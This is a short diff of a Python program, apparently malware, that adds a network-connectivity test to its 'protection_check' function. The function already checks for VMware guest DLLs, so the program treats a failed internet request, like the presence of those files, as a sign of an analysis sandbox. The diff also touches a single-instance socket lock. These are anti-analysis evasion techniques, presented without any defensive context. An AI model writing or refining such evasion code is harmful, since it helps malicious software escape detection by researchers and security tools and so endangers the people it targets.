@@ -3,9 +3,15 @@ import getmac
 import psutil
 import subprocess
 import socket
+import requests
 import sys
 
 def protection_check():
+    try: 
+        requests.get("https://google.com") # the method may change in the future
+    except requests.ConnectionError:
+        return True
+    
     vm_files = [
         "C:\\windows\\system32\\vmGuestLib.dll",
         "C:\\windows\\system32\\vm3dgl.dll",
@@ -292,7 +298,7 @@ web_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 def single_instance_lock():
     try:
         web_socket.bind(('localhost', 12344))
-    except socket.error: # on error socket is occupied -> funtion returns true
+    except socket.error: # on error socket is occupied -> another instance is running
         return True
 
     return False
